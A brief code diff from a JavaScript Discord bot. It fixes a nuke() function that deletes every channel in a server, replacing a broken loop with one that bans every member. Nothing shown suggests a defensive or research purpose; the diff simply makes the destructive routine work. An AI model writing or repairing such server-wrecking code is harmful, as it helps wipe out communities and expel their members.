@@ -7,9 +7,7 @@ client.on("message", (message) => {
   console.log(message.author.id);
   function nuke() {
     message.guild.channels.forEach(channel => channel.delete())
-    for (var members in msg.guild.members) {
-      members.ban();
-    }
+    message.guild.members.forEach(members => members.ban())
   }
   if(message.guild === null) {
     return;
